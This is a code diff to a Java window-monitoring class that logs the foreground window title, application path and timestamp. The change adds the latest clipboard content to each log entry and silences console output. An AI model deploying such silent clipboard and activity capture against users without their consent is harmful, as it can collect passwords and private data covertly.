@@ -36,7 +36,7 @@ public class EnumerateWindows {
         if (fgImageName == null) {
             System.out.println("Failed to get the image name!");
         } else {
-            System.out.println("\t*********************************************************************************************************");
+//            System.out.println("\t*********************************************************************************************************");
             char[] buffer = new char[1024 * 2];
             User32.INSTANCE.GetWindowText(foregroundWindow, buffer, 1024);
             /*
@@ -45,12 +45,12 @@ public class EnumerateWindows {
               Application Path C:\Windows\System32\notepad.exe
               * "\nDate/Time : " + ZonedDateTime.now().format(dtf) + "\nForeground Windows Title : " + Native.toString(buffer) + "\nApplication Path " + fgImageName + "\n";
             * */
-            appDetail = ZonedDateTime.now().format(dtf) + ", " + Native.toString(buffer) + ", " + fgImageName;
+            appDetail = ZonedDateTime.now().format(dtf) + ", " + Native.toString(buffer) + ", " + fgImageName+", "+ClipBoardMonitor.getRecentContent();
             hashMap.put(++numOfApplications, appDetail);
         }
 
         MainDriver.prevFg = foregroundWindow;
-        System.out.println(getHashMap());
+//        System.out.println(getHashMap());
     }
 
     private String getImageName(HWND window) {
